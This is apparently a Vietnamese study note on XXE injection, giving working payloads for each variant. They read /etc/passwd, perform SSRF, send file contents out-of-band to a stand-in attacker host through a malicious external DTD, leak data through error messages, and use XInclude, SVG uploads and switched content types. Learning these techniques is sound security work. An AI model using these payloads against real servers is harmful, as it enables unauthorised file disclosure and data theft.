# Overview  
XML external entity injection là lỗ hổng cho phép kẻ tấn công có thể can thiệp vào việc xử lý dữ liệu
XML của ứng dụng. Nó thường cho phép kẻ tấn công có thể xem các tệp trên server và tương tác với các hệ
thống khác mà server có thể tương tác được  

# Phân loại  
1. XXE to retrieve files: đọc nội dung của file và trả về trên response của ứng dụng  
2. XXE perform SSRF: redirect đến một URL bên ngoài server  
3. Blind XXE exfiltrate data out-of-band: sensitive data được gửi từ server đến một máy chủ khác do kẻ
tấn công quản lý  
4. Blind XXE to retrieve data via error message: trigger các thông báo lỗi kèm theo sensitive data  

## XXE ti retrieve files  
Để thực hiện cần phải chỉnh sửa data XML gửi lên server theo 1 trong 2 cách:
1. tạo hoặc sửa `DOCTYPE` element, cái mà định nghĩa một external entity bao gồm đường dẫn file  
2. Sửa giá trị XML được trả về trong response, đùng chúng để xác định các external entity  
**VD**  
```  
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
<stockCheck><productId>&xxe;</productId></stockCheck>   
```  

## XXE to perform SSRF attacks  
Để thực hiện, cần phải định nghĩa một external XML entity sử dụng URL mà mình nhắm làm mục tiêu, và sử
dụng nó với một giá trị data. Khi có thể sử dụng với một giá trị data thì nó sẽ trả về theo response của
ứng dụng, và mình có thể thấy data từ URL hiện thị trên ứng dụng. Nghĩa là bạn phải xác định một URL có trả
về để có được sự tương tác 2 chiều với backend, nếu không thì chỉ có thể thực hiện blind SSRF attacks  
**VD**  
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>`  
**lưu ý** có thể khi gọi tới URL sẽ không trả về data mà trả về các folder, tiếp tục follow theo folder
đến khi gặp thông tin cần thiết   
  
## Blind XXE vulnerabilities  
Đây là dạng server sẽ không trả về dữ liệu của các external entity trong response. Có 2 cách để khai thác lô
hổng này.
1. Trigger out-of-band network interaction, đôi khi dữ liệu nhạy cảm sẽ có trong dữ liệu interaction  
2. Trigger XML parsing error, giống như cách trích xuất sensitive data thông qua error message  

### Detect blind XXE using out-of-band  
Phương pháp tương tự như XXE SSRF attack nhưng trigger ra mạng bên ngoài tới hệ thống mà bạn quản lý
. Ví dụ, có thể định nghĩa một external entity  
`<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>`  

Sau đó sử dụng entity này trong một data value XML. XXE attack sẽ khởi tạo một HTTP request ở backend
request tới server mà attacker điều khiển. Attacker dựa vào việc monitor DNS lookup và HTTP request để
xác định XXE thành công  
Đôi khi, các entỉty thông thường bị chặn do bộ lọc của ứng dụng. Trong trường hợp này có thể sử dụng 
XML parameter để thay thế. XML parameter là một dạng đặc biệt của XML entity cái mà chỉ có thể tham chiếu
đến nơi khác với DTD. Để làm được việc này, cần phải thực hiện 2 việc:  
1. Khai báo 1 XML parameter entity bao gồm dấu `%` trước entity name  
`<!ENTITY % myparameterentity "my parameter entity value" >`  
2. parameter entity được tham chiếu sử dụng dấu `%` thay cho dấu `&` như thông thường  
`%myparameterentity;`  
Do đó có thể test blind XXE out-of-band thông qua XML parameter entity `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>`  
Payload này định nghĩa một XML parameter entity `xxe` và sử dụng entity trong DTD  
`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://abc.com"> %xxe;]>`  
  
### Blind XXE to exfiltrate data out-of-band  
Lỗ hổng này liên quan đến việc attacker lưu trữ một DTD độc hại tại server của mình, sau đó gọi external 
DTD từ in-band XXE payload. VĐ của môt DTD độc hại:    
``` 
<!ENTITY % file SYSTEM "file:///etc/passwd">  
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">  
%eval;  
%exfiltrate;  
```
Các bước thực hiện DTD:
1. Định nghĩa XML parameter entity gọi là `file` lưu nội dung file `/etc/passwd`  
2. Định nghĩa XML parameter entity gọi là `eval` lưu trữ 1 định nghĩa động của một XML parameter khác
gọi là `exfiltrate`. Entity `exfiltrate` thực hiện HTTP request tới entity `file` chứa nội dung của tệp  
3. Sử dụng entity `eval` sẽ khiến khai báo động entity `exfiltrate` được thực hiện  
4. Sử dụng entity `exfiltrate` để gửi request tới URL được chỉ định  
  
Attacker cần lưu file DTD trên host của mình sau đó load vào web bị target. VD XXE payload trên target:  
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM  
"http://web-attacker.com/malicious.dtd"> %xxe;]>  
```
 XXE payload định nghĩa một XML parameter gọi là `xxe` và sử dụng entity với DTD. Điều này sẽ làm cho trình 
 phân tích XML load external DTD từ server attacker và interpret nó. Các bước tiếp theo tùy thuộc vào nội dung file DTD. 
  Sau cùng dữ liệu sẽ được gửi về server attacker  
  
### Blind XXE to retrieve data via error messages  
Hướng tấn công này lợi dụng việc server gửi trả thông báo lỗi để lấy sensitive data. Về cách thức nó tương tự như trên. VD external DTD
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error; 
```  
## Các loại khác   

### XInclude attack  
Một số ứng dụng nhận dữ liệu từ người dùng, tại server sẽ chèn vào file XML rồi mới tiến hành phân tích. Một ví dụ là khi user
gửi dữ liệu lên máy chủ backend SOAP, cái được xử lý bởi backend SOAP service  
Trong trường hợp này, bạn sẽ không thể thực hiện một cuộc tấn công XXE bình thường, bởi vì mình không thể điều khiển được đầu
vào XML, nên không thể thay đổi, định nghĩa một `DOCTYPE` element. Tuy nhiên, ta có thể sử dụng `XInclude`, `XInclude` là một
phần của XML, cái cho phép XML được build từ một sub-documents. Có thể thực hiện `XInclude` với bất kì giá trị dữ liệu nào của
XML  
Để thực hiện `XInclude` attack, bạn cần tham chiếu một `XInclude` namspace và cung cấp đường dẫn file mà bạn cần  
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo> 
```  
VD chèn `XInclude` vào biến `productID` trong post request  
`productId=<foo+xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include+parse="text"+href="file:///etc/passwd"/></foo>&storeId=1`  

### XXE attack via file upload  
Có những trang web cho user upload file và xử lý tại server-side. Một vài file format sử dụng XML chính hoặc trong các component
Tệp office `DOCX` và image SVG là một trong những file XML-based format  
Ứng dụng cho phép tải ảnh, xử lý và validate dữ liẹu tại server. Nếu ứng dụng chấp nhận format PNG, JPEG, thư viện xử lý ảnh 
có thể hỗ trợ SVG. Chính vì hỗ trợ SVG, attacker có thể gửi file SVG độc hại để thực hiện một XXE attack  
```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="240px" height="240px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="23" x="0" y="16">&xxe;</text>
</svg>
```  
Một ví dụ về payload SVG, ta tạo 1 file SVG với nội dung như trên. Chúng ta chú ý đến  attribute `<text font-size="23" x="0" y="16">&xxe;</text>`.
Attribute này rất quan trọng, nó quyết định font chữ khi ta lấy dữ liệu ra và ghi vào file svg. `font-size` xác định độ lớn cỡ chữ, 2
attribute `x, y` xác định vị trí của text sẽ in trên ảnh. Khi upload thành công, ta sẽ thấy nội dung của file được ghi vào hình ảnh  
  
### XXE attacks via modified content type  
Thông thường các Post request sẽ sử dụng nội dung từ form HTML như là `application/x-www-form-urlencoded`
Với một post request thông thường:  
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar 
```  
Ta có thể submit dưới dạng xml:  
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```  
Nếu ứng dụng chấp nhận định dang XML thì ta chỉ cần chuyển request sang dạng XML và thực hiện tấn công như bình thường.  



